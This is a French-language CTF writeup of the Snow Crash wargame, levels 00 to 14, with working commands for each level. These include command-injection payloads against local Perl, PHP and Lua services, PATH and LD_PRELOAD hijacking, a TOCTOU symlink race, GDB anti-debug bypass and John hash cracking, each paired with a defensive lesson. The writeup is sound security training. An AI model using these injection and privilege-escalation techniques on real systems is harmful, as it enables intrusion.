# Snow Crash — Writeup

> Wargame d'introduction à la sécurité informatique.
> Objectif : à chaque niveau, trouver le mot de passe de l'utilisateur `flagXX`,
> se connecter en tant que `flagXX`, puis exécuter `getflag` pour obtenir le token
> servant de mot de passe au niveau suivant.

**Environnement** : VM 64-bit (ISO fournie), accès SSH sur le port `4242`.
**Login initial** : `level00` / `level00`.
**Périmètre** : partie obligatoire (00–09) + bonus (10–14), soit les 15 niveaux.

**Méthode appliquée à chaque niveau** : exploration de base avant analyse.

```bash
id                              # qui suis-je, quels groupes
ls -la                          # ce que contient mon home
find / -user flagXX 2>/dev/null # les fichiers du compte cible
```

Et trois questions systématiques face à tout élément suspect :
**qui** l'exécute, **quand**, et **avec quels droits**.

---

## Level00 — Chiffrement par décalage (César)

**Contexte**
On trouve sur le système un fichier en lecture seule appartenant à `flag00`,
contenant la chaîne `cdiiddwpgswtgt`.

**Raisonnement**
La chaîne ne ressemble à rien de lisible mais conserve une structure de mot.
Hypothèse : un chiffrement par substitution simple, typiquement un décalage de
type César. Plutôt que de tester un seul décalage, on les essaie tous les 25.

**Exploitation**
```bash
for i in $(seq 1 25); do
    echo -n "Decalage $i : "
    echo "cdiiddwpgswtgt" | tr 'a-z' "$(python3 -c "
import string
a = string.ascii_lowercase
print(a[$i:] + a[:$i])
")"
done
```

Le décalage 11 donne `nottoohardhere` → **"not too hard here"**.

```bash
su flag00   # mot de passe : nottoohardhere
getflag
```

**Notion clé**
Reconnaître un chiffrement faible à sa structure, et casser un César en testant
l'espace réduit des décalages possibles (force brute légitime sur 25 cas).

---

## Level01 — Hash DES dans /etc/passwd

**Contexte**
La ligne de `flag01` dans `/etc/passwd` contient directement un hash au lieu du
classique `x` :

```bash
cat /etc/passwd | grep flag01
# flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```

**Raisonnement**
Historiquement, les anciens systèmes Unix stockaient le hash du mot de passe
directement dans `/etc/passwd` (avant l'introduction de `/etc/shadow`). Le hash
`42hDRfypTqqnw` fait 13 caractères : signature typique du **DES Unix**.

**Exploitation**
Sur la machine hôte, avec John the Ripper :

```bash
echo "flag01:42hDRfypTqqnw" > /tmp/hash.txt
john --format=descrypt /tmp/hash.txt
```

John retrouve le mot de passe à partir de ses dictionnaires intégrés.

**Notion clé**
Identifier un type de hash par sa longueur et son format. Un mot de passe stocké
en clair (ou faiblement haché) et lisible par tous est une faille de
configuration majeure.

---

## Level02 — Reconstruction de frappe depuis une capture réseau

**Contexte**
Un fichier `.pcap` (capture réseau) est présent. Le `cat` direct est illisible.
On le récupère sur la machine hôte avec `scp` pour l'ouvrir dans Wireshark.

```bash
scp -P 4242 level02@<IP_VM>:/chemin/vers/capture.pcap /tmp/
```

**Raisonnement**
Une capture réseau enregistre tout le trafic, y compris les données en clair.
On cherche un mot de passe ayant transité. Plutôt que d'inspecter paquet par
paquet, on reconstruit la session complète :
clic droit sur un paquet → **Follow > TCP Stream**.

On y découvre une session de login. La ligne du mot de passe contient des
caractères de contrôle :

```
Password: ft_wandr...NDRel.L0L
```

**Exploitation**
Les `.` représentent des **Backspace** (caractères de contrôle). Il faut
reconstituer la frappe en appliquant chaque effacement au caractère précédent,
dans l'ordre. Le résultat est :

```
ft_waNDReL0L
```

**Notion clé**
Les protocoles non chiffrés exposent tout sur le réseau. Une capture peut
révéler des identifiants, et reconstruire une frappe terminal demande de tenir
compte des caractères de contrôle (Backspace), pas seulement du texte visible.

---

## Level03 — Binaire SUID et manipulation du PATH

**Contexte**
```bash
ls -la
# -rwsr-sr-x 1 flag03 level03 8627 level03
```

Un binaire `level03` appartenant à `flag03`, avec le bit **SUID** (`s`).
Lancé, il affiche `Exploit me`.

**Raisonnement**
Le bit SUID fait s'exécuter le binaire avec les droits de son **propriétaire**
(`flag03`), pas de l'utilisateur qui le lance. L'analyse des chaînes révèle
comment il fonctionne en interne :

```bash
strings ./level03
# ...
# /usr/bin/env echo Exploit me
```

Le binaire appelle `echo` via `/usr/bin/env`. Or `env` cherche les commandes
dans les dossiers listés par la variable `PATH`, **dans l'ordre**. Si on place
un faux `echo` dans un dossier prioritaire, c'est lui qui sera exécuté — avec
les droits de `flag03`.

**Exploitation**
```bash
echo "getflag" > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```

**Notion clé**
Un binaire SUID qui appelle une commande sans chemin absolu est vulnérable au
détournement de `PATH`. Toujours invoquer les commandes par leur chemin complet
dans un programme privilégié.

---

## Level04 — Injection de commande via CGI Perl

**Contexte**
Un script Perl tourne comme serveur web sur `localhost:4747`, propriété de
`flag04` avec le bit SUID.

```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

**Raisonnement**
Le script récupère le paramètre HTTP `x` et l'injecte directement dans une
commande shell (les backticks `` ` `` exécutent une commande). Aucune validation
de l'entrée → injection de commande. On confirme d'abord sous quel utilisateur
tourne le serveur :

```bash
curl "http://localhost:4747?x=\`id\`"
# uid=3004(flag04) ... → on est bien flag04 via le serveur
```

**Exploitation**
```bash
curl "http://localhost:4747?x=\`getflag\`"
```

Les `\` empêchent le shell **local** d'interpréter les backticks ; ils sont
transmis tels quels au serveur, qui les exécute côté Perl avec les droits de
`flag04`.

**Notion clé**
Ne jamais injecter une entrée utilisateur dans une commande shell sans
validation. Injection de commande classique (OWASP Top 10). La substitution de
commande (`` ` `` ou `$()`) s'évalue côté serveur si elle est correctement
échappée côté client.

---

## Level05 — Tâche cron et dossier surveillé

**Contexte**
Un script `openarenaserver` (propriété de `flag05`) contient :

```bash
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

**Raisonnement**
Plusieurs indices comportementaux indiquent une exécution **automatique** :
le script exécute tous les fichiers d'un dossier sans interaction, les supprime
ensuite (pour repartir propre au prochain passage), et limite chaque exécution à
5 secondes (`ulimit -t 5`) — un pattern typique de worker planifié.

On applique les trois questions : qui ? quand ? avec quels droits ? La recherche
dans les crontabs système (`/etc/crontab`, `/etc/cron.d/`) ne donne rien
d'exploitable, et le crontab de `flag05` n'est pas lisible. On vérifie alors
l'hypothèse directement en pratique, puisqu'on a les droits d'écriture sur
`/opt/openarenaserver/` (confirmé via `getfacl`).

**Exploitation**
```bash
echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
# Attendre le passage du cron, puis :
cat /tmp/flag
```

Le fichier déposé est exécuté avec les droits de `flag05`.

**Notion clé**
Les tâches cron tournent souvent avec des droits élevés. Pouvoir écrire dans un
dossier surveillé par un cron privilégié permet d'exécuter du code arbitraire
avec ses droits.

---

## Level06 — Injection de code via `preg_replace /e` (PHP)

**Contexte**
Un binaire SUID `level06` (propriété de `flag06`) appelle un script PHP qui lit
un fichier et applique :

```php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    ...
}
```

**Raisonnement**
Le modificateur `/e` (déprécié, supprimé en PHP 7) **évalue la chaîne de
remplacement comme du code PHP**. Tout ce qui est capturé par `(.*)` entre
`[x ...]` est injecté dans `y("...")` puis exécuté. Le format à fournir dans le
fichier se déduit directement de la regex : `[x QUELQUECHOSE]`.

Deux obstacles rendent l'injection non triviale :
1. La capture passe par `y()`, qui transforme tout `.` en ` x ` → impossible
   d'utiliser la concaténation PHP (`.`).
2. Les guillemets dans le payload cassent la chaîne `y("...")`.

L'erreur PHP, une fois provoquée, révèle exactement le code évalué :
`y("...")`, ce qui guide la construction du payload.

**Exploitation**
On utilise l'interpolation de variable complexe `{${ ... }}`, qui force PHP à
évaluer l'expression interne sans point ni guillemet problématique :

```bash
printf '[x {${system(getflag)}}]' > /var/tmp/exploit
./level06 /var/tmp/exploit a
```

`getflag` passé sans guillemets (constante non définie → chaîne, simple Notice).
`system(getflag)` s'exécute avec les droits de `flag06`.

**Notion clé**
Le modificateur `/e` de `preg_replace` est une faille d'exécution de code
arbitraire historique (d'où sa suppression du langage). Lire la regex donne le
format d'entrée accepté ; les messages d'erreur de l'interpréteur sont un guide
précieux pour affiner un payload.

---

## Level07 — Injection via variable d'environnement

**Contexte**
Un binaire SUID `level07` (propriété de `flag07`). L'analyse des chaînes révèle
sa logique :

```bash
strings level07
# LOGNAME
# /bin/echo %s
# getenv ... asprintf ... system
```

Logique reconstruite :
```c
asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));
system(buffer);
```

**Raisonnement**
Le binaire lit la variable d'environnement `LOGNAME` (contrôlée par
l'utilisateur), l'insère dans `/bin/echo %s`, et exécute le tout via `system`.
Mettre `LOGNAME=getflag` ne suffit pas : la commande devient `/bin/echo getflag`,
et `getflag` n'est qu'un argument d'`echo`. Il faut le transformer en commande
séparée avec `;`.

**Exploitation**
```bash
LOGNAME=";getflag"
./level07
```

La commande exécutée devient `/bin/echo ;getflag` → `getflag` s'exécute comme
commande indépendante, avec les droits de `flag07`.

**Notion clé**
Les variables d'environnement sont une entrée utilisateur. Les injecter dans une
commande système sans contrôle ouvre la porte à l'exécution arbitraire — même
vecteur que le level04, source différente.

---

## Level08 — Contournement de filtre par lien symbolique

**Contexte**
```bash
ls -la
# -rwsr-s---+ 1 flag08 level08 8617 level08
# -rw------- 1 flag08 flag08    26 token
```

Le binaire `level08` (SUID `flag08`) est un lecteur de fichier, mais refuse de
lire le fichier `token` :

```bash
./level08 token
# You may not access 'token'
```

**Raisonnement**
L'analyse des chaînes montre `strstr` et le message de refus côte à côte. Le
binaire cherche la sous-chaîne `token` dans le chemin fourni, et refuse si elle
est présente :

```c
if (strstr(argv[1], "token")) { printf("You may not access ..."); exit(1); }
```

Confirmé empiriquement : `./level08 token` est refusé, `./level08 /tmp/test`
fonctionne. Le filtre porte sur le **texte** du chemin, pas sur le fichier réel.
Il suffit donc de désigner le même fichier par un chemin ne contenant pas la
chaîne `token` — un lien symbolique.

**Exploitation**
```bash
ln -s /home/user/level08/token /tmp/ouvretoi   # chemin ABSOLU vers la cible
./level08 /tmp/ouvretoi
```

> Piège rencontré : un symlink créé avec un chemin **relatif**
> (`ln -s token /tmp/lien`) pointe vers `token` dans le dossier du lien (`/tmp`),
> qui n'existe pas. Toujours utiliser un chemin absolu vers la cible. À noter
> aussi qu'un hard link ne peut pas traverser deux systèmes de fichiers
> (`Invalid cross-device link`).

**Notion clé**
Un filtre basé sur le nom/texte d'un chemin est trivial à contourner : un lien
symbolique fournit un nom alternatif vers la même donnée. Valider une cible par
son chemin textuel est insuffisant.

---

## Level09 — Reverse d'un chiffrement maison

**Contexte**
Un binaire `level09` (SUID `flag09`) et un fichier `token` illisible
(`----r--r--`, lisible par le groupe `level09`). En testant le binaire :

```bash
./level09 ok                  # → ol
./level09 aaaaaaaa...         # → abcdefgh...
```

**Raisonnement**
Tous les caractères d'entrée identiques (`a`) produisent une sortie croissante
(`a b c d ...`) : chaque caractère est décalé d'une valeur égale à **sa
position** dans la chaîne.

```
position 0 : a +0 → a
position 1 : a +1 → b
position 2 : a +2 → c
```

Confirmé par `ok` → `ol` (`o`+0=`o`, `k`+1=`l`). Le `token` est le résultat
chiffré de cette opération. Pour le déchiffrer, on applique l'opération inverse :
`original = chiffré − position`.

Le binaire contient des protections anti-reverse (`ptrace`, détection
`LD_PRELOAD` via `/proc/self/maps`), contournées sans les affronter : on raisonne
uniquement sur le comportement observable entrée/sortie.

**Exploitation**
Programme C de déchiffrement (lecture des octets bruts + soustraction par
position) :

```c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

int main(int ac, char **av)
{
    if (ac != 2) { printf("Wrong number arguments\n"); return 1; }
    int file = open(av[1], O_RDONLY);
    if (file < 0) { printf("Open failed\n"); return 1; }
    char buffer[1024];
    int ret = read(file, buffer, 1024);
    if (ret <= 0) { printf("Read failed\n"); return 1; }
    int i = 0;
    while (i < ret && buffer[i] != '\n') {  // s'arrêter au \n final
        putchar(buffer[i] - i);
        i++;
    }
    putchar('\n');
    return 0;
}
```

> Pièges rencontrés : la condition d'arrêt `while (buffer[i])` lisait au-delà des
> octets réels (le fichier n'est pas une chaîne terminée par `\0`) → utiliser le
> retour de `read`. Et le fichier se termine par un `\n` (`0a`, vérifié avec
> `xxd`) qui, déchiffré, produisait un caractère parasite → s'arrêter au `\n`.

**Notion clé**
Sécurité par l'obscurité : un algorithme « secret » mais trivialement réversible
n'offre aucune protection une fois compris. Reverse engineering par observation
du comportement (boîte noire), sans débogueur, contournant ainsi les protections
anti-debug. `xxd`/`od` servent à **inspecter** des données binaires, pas à les
transformer.

---

## Level10 — Race condition TOCTOU

**Contexte**
Un binaire SUID `level10` (propriété de `flag10`) envoie le contenu d'un fichier
vers un host sur le port 6969, *si l'utilisateur a accès au fichier*. Logique
reconstruite via `strings` (présence de `access`, `open`, `read`, fonctions
réseau `socket`/`connect`) :

```c
if (access(file, R_OK) != 0) {
    printf("You don't have access to %s\n", file);
    exit(1);
}
fd = open(file, O_RDONLY);   // ouverture SÉPARÉE de la vérification
read(fd, buffer, ...);       // puis envoi réseau
```

**Vulnérabilité**
`access` vérifie les droits, puis `open` ouvre le fichier — deux opérations
distinctes séparées par un délai. Le développeur suppose que le fichier vérifié
et le fichier ouvert sont identiques. En manipulant un lien symbolique entre les
deux instants, on casse cette hypothèse. C'est une faille **TOCTOU**
(Time-Of-Check to Time-Of-Use).

> Le `host` attendu est une **IP** (le binaire utilise `inet_addr`), donc
> `127.0.0.1` et non `localhost`.

**Exploitation**
On fait osciller en boucle la cible d'un symlink entre un fichier autorisé
(passe `access`) et `token` (lu par `open`), tout en martelant le binaire et en
écoutant le port. C'est une **race condition** : on court contre le programme
pour basculer le lien au bon moment.

```bash
# Terminal 1 — oscillation du lien
echo leurre > /tmp/monfichier
while true; do ln -sf /tmp/monfichier /tmp/lien; ln -sf /home/user/level10/token /tmp/lien; done

# Terminal 2 — appel répété du binaire
while true; do ./level10 /tmp/lien 127.0.0.1; done

# Terminal 3 — écoute
nc -lk 6969
```

Statistiquement, le lien finit par pointer vers le fichier autorisé pile au
moment du `access` et vers `token` pile au moment du `open`. Le token apparaît
alors dans `nc`.

**Notion clé**
Une vérification de droits (`access`) et l'utilisation effective (`open`)
doivent porter sur la **même ressource atomiquement**. Vérifier puis utiliser en
deux temps ouvre une fenêtre exploitable. Bonne pratique : ouvrir d'abord, puis
vérifier les droits sur le descripteur (`fstat`), plutôt que `access` + `open`.

---

## Level11 — Injection de commande dans un serveur Lua

**Contexte**
Un script Lua tourne en permanence comme serveur réseau, lancé par `flag11`
(repéré via `find / -user flag11` qui révèle `/proc/1955`, confirmable avec
`ps aux | grep lua`). Il écoute sur `127.0.0.1:5151`, demande un mot de passe,
et le hache :

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  ...
end
```

**Vulnérabilité**
L'entrée du client (`pass`) est concaténée directement dans une commande shell
passée à `io.popen`, sans validation ni échappement. Le serveur tournant sous
`flag11`, toute commande injectée s'exécute avec ses droits.

**Le piège à éviter**
La comparaison du hash à `f05d1d066...` est un leurre : la satisfaire
reviendrait à casser un SHA1 (infaisable). Le message `Erf nope..` / `Gz you
dumb*` n'a aucune importance — la cible n'est pas la comparaison mais
l'exécution de code via `io.popen`.

**Exploitation**
On se connecte avec netcat et on injecte une commande exécutant `getflag`, en
redirigeant sa sortie vers un fichier lisible (sinon elle part dans le
`| sha1sum`) :

```bash
nc 127.0.0.1 5151
# Password: ; getflag > /tmp/flag11; echo
cat /tmp/flag11
```

Le `;` termine le `echo` initial, `getflag` s'exécute sous `flag11`, sa sortie
est sauvegardée, et le `echo` final neutralise le `| sha1sum` qui suit.

**Notion clé**
Même leçon que les levels 04 et 07, dans un nouveau contexte (serveur réseau
Lua). Détail propre à ce vecteur : quand la sortie de la commande vulnérable est
consommée par un pipe, rediriger vers un fichier permet de récupérer le résultat.

---

## Level12 — Injection Perl CGI avec contraintes de filtrage

**Contexte**
Un script Perl CGI (`localhost:4646`), propriété de `flag12` avec SUID, insère
un paramètre utilisateur dans une commande shell via backticks :

```perl
$xx = $_[0];
$xx =~ tr/a-z/A-Z/;        # passage en MAJUSCULES
$xx =~ s/\s.*//;           # coupe au premier ESPACE
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

**Vulnérabilité**
Injection de commande, bridée par deux transformations sur l'entrée : mise en
majuscules et suppression de tout ce qui suit le premier espace.

**Les obstacles et leurs contournements**
- *Pas d'espace possible* → `${IFS}` (séparateur de champs shell) remplace
  l'espace.
- *Tout passe en majuscules* → impossible d'écrire `getflag` ou `/tmp/` (qui
  deviendrait `/TMP/`). Solution : déporter le code minuscule dans un **script
  externe** (`/tmp/SCRIPT.SH`, nom en majuscules), dont le contenu n'est pas
  affecté par le `tr`.
- *Désigner le script sans écrire `tmp` en minuscules* → **globbing** :
  `/*/SCRIPT.SH`, où le `*` (non alphabétique) survit au `tr` et s'étend vers
  `/tmp/SCRIPT.SH`.
- *Forcer l'exécution* → la **substitution de commande** (backticks) s'évalue
  toujours en premier, contrairement au `;` qui se faisait absorber dans les
  guillemets de `egrep`.

**Exploitation**
```bash
# /tmp/SCRIPT.SH (exécutable, chmod +x) :
#   #!/bin/sh
#   getflag > /tmp/flag1

curl "http://localhost:4646/?x=%60/*/SCRIPT.SH%60&y=salut"
cat /tmp/flag1
```
`%60` = backtick encodé pour l'URL. Le serveur exécute `` `/*/SCRIPT.SH` `` sous
l'identité `flag12`.

**Méthode de debug clé**
Face à un service opaque, on a inséré un mouchard (`id > /tmp/MOUCHARD`) dans le
script pour confirmer l'exécution et l'identité effective. C'est ce point
d'observation qui a permis d'isoler le vrai problème (le vecteur d'exécution :
backticks plutôt que `;`).

**Notion clé**
Un filtre d'entrée (majuscules, suppression d'espaces) complique l'injection
mais ne la prévient pas : on déporte les contraintes (script externe), on
contourne avec des caractères non filtrés (`*`, `${IFS}`, backticks). Filtrer ≠
sécuriser.

---

## Level13 — Détournement de fonction via LD_PRELOAD

**Contexte**
Un binaire SUID `level13` (propriété de `flag13`) vérifie l'UID de l'utilisateur
et n'affiche le token que si cet UID vaut `4242` :

```c
if (getuid() != 4242) {
    printf("UID %d started us but we we expect %d\n", getuid(), 4242);
    exit(1);
}
// sinon : déchiffre (ft_des) et affiche le token
```
L'UID 4242 n'existe pas sur le système (`/etc/passwd`).

**Vulnérabilité**
Le binaire fait confiance à `getuid()`, fonction de la libc chargée
dynamiquement. La variable `LD_PRELOAD` permet de précharger une bibliothèque
personnelle dont les fonctions **écrasent** celles de la libc. On fournit donc
un `getuid()` maison retournant `4242`.

**L'obstacle du SUID**
Le linker dynamique **ignore `LD_PRELOAD` sur les binaires SUID** (protection :
empêcher l'injection de code dans un programme privilégié). Le preload reste
donc sans effet sur le binaire d'origine.

**Contournement**
Le binaire n'a pas besoin de son SUID (il déchiffre et affiche le token
lui-même une fois `getuid()` validé). En **copiant** `level13` dans `/tmp`, la
copie perd le bit SUID et appartient à `level13` → `LD_PRELOAD` redevient actif.

**Exploitation**
```c
// fake.c
int getuid(void) { return 4242; }
```
```bash
gcc -m32 -fPIC -c fake.c -o fake.o          # -m32 : rester en 32 bits
gcc -m32 -shared -o /tmp/fake.so fake.o
cp /home/user/level13/level13 /tmp/level13  # copie : perd le SUID
export LD_PRELOAD=/tmp/fake.so
/tmp/level13
```

**Notion clé**
La liaison dynamique est un vecteur d'attaque : `LD_PRELOAD` permet de
substituer n'importe quelle fonction de bibliothèque. Le système s'en protège
sur les binaires SUID, mais cette protection tombe dès qu'on retire le SUID. Ne
jamais faire reposer une décision de sécurité sur une fonction librement
remplaçable.

---

## Level14 — Contournement anti-debug et falsification de registre (GDB)

**Contexte**
Home vide, `find / -user flag14` ne retourne rien. Le seul vecteur est le binaire
`getflag` lui-même (`/bin/getflag`), qui contient une table de tokens chiffrés
(`ft_des`) et affiche celui correspondant à l'UID réel qui le lance. Le token de
flag14 nécessite l'UID `3014`.

**Les deux protections**
1. `ptrace(PTRACE_TRACEME, ...)` : auto-traçage anti-debug. Si un débogueur est
   attaché, l'appel échoue et le programme affiche `You should not reverse this`
   puis quitte.
2. Comparaison de l'UID réel à `3014` avant d'afficher le token. `LD_PRELOAD` est
   bloqué (détection via `/proc/self/maps`), donc la méthode du level13 est
   inopérante.

**Exploitation (approche GDB, la plus formatrice)**

Contourner `ptrace` en interceptant le syscall et en forçant sa valeur de retour
(`$eax`) à 0 :
```
gdb /bin/getflag
catch syscall ptrace
commands 1
set ($eax) = 0
continue
end
```

Identifier la comparaison d'UID dans le désassemblage (`disass main`) :
```asm
0x08048afd: call   <getuid@plt>      ; $eax = UID réel (2014)
0x08048b02: mov    %eax,0x18(%esp)   ; sauvegarde sur la pile
0x08048b06: mov    0x18(%esp),%eax   ; recharge dans $eax
0x08048b0a: cmp    $0xbbe,%eax       ; compare à 0xbbe = 3014
0x08048b0f: je     <main+901>        ; saut vers la branche "affiche token"
```

Poser un breakpoint juste avant le `cmp` et forcer `$eax` à 3014 :
```
b *0x08048b0a
run
set ($eax) = 3014
continue
```
La comparaison `3014 == 3014` réussit, le `je` saute vers la branche qui
déchiffre et affiche le token.

**Lecture de l'assembleur (syntaxe AT&T)**
- `$0xbbe` : valeur immédiate (`$` = constante), `0xbbe` = 3014.
- `%eax` : registre (`%` = registre). En i386, valeur de retour des fonctions.
- Ordre `source, destination` (inverse d'Intel). `cmp $0xbbe,%eax` = compare eax
  à 3014.

**Approches alternatives**
- *Reverse hors-ligne* : décompiler `getflag`, extraire le token chiffré de
  flag14, réimplémenter `ft_des` dans un programme C local et déchiffrer
  hors-ligne. Aucune interaction avec la VM, mais reverse complet de
  l'algorithme.
- *Dirty COW (CVE-2016-5195)* : exploiter une faille du noyau pour devenir
  root, puis `su flag14`. Disproportionné et destructif, mais illustre une vraie
  escalade système (possible car la VM utilise un noyau ancien et vulnérable).

**Notion clé**
Les protections anti-debug (`ptrace`) se contournent en interceptant le syscall.
Une décision de sécurité prise côté client (comparaison d'UID en mémoire) est
falsifiable par qui contrôle l'exécution : un débogueur peut réécrire registres
et mémoire à la volée. Un même objectif admet plusieurs chemins, à différents
niveaux d'abstraction (programme ciblé, reverse hors-ligne, exploit kernel).

---

## Récapitulatif des techniques

| Level | Domaine | Technique |
|-------|---------|-----------|
| 00 | Cryptographie | Chiffrement César / décalage |
| 01 | Cryptographie | Cassage de hash DES (John) |
| 02 | Réseau | Analyse PCAP + reconstruction de frappe |
| 03 | Système | Binaire SUID + détournement de PATH |
| 04 | Web | Injection de commande (CGI Perl) |
| 05 | Système | Tâche cron + dossier surveillé |
| 06 | Web | Injection de code (`preg_replace /e` PHP) |
| 07 | Système | Injection via variable d'environnement |
| 08 | Système | Contournement de filtre par symlink |
| 09 | Reverse | Reverse d'un chiffrement maison |
| 10 | Système | Race condition TOCTOU |
| 11 | Réseau/Web | Injection de commande (serveur Lua) |
| 12 | Web | Injection Perl avec contournement de filtres |
| 13 | Système | Détournement de fonction (`LD_PRELOAD`) |
| 14 | Reverse | Anti-debug + falsification de registre (GDB) |

## Principes transversaux

- **Explorer avant d'analyser** : `id`, `ls -la`, `find / -user flagXX`.
- **Trois questions** face à tout élément actif : qui l'exécute, quand, avec
  quels droits.
- **`strings` pour le reverse basique** : repérer les fonctions (`system`,
  `getenv`, `strstr`, `open`...) et les chaînes de données, puis reconstituer la
  logique et la confirmer empiriquement.
- **Ne jamais faire confiance à une entrée utilisateur** : argument,
  paramètre HTTP, variable d'environnement, nom de fichier — tout est un vecteur.
- **Sécurité par l'obscurité ≠ sécurité** : un secret cesse de protéger dès qu'il
  est compris.
- **Un objectif, plusieurs chemins** : un même accès peut s'obtenir en ciblant le
  programme (GDB), en le contournant (reverse hors-ligne) ou en attaquant le
  système sous-jacent (exploit kernel). Le choix dépend de la discrétion, de la
  fiabilité et de l'effort.

## Note sur les outils (portabilité soutenance)

Les soutenances se déroulent sur des machines Fedora sans Kali. Les outils
privilégiés sont donc natifs ou en ligne : `john`, `wireshark`/`tshark`, `gcc`,
`xxd`, et les services web `regex101.com`, `crackstation.net`.
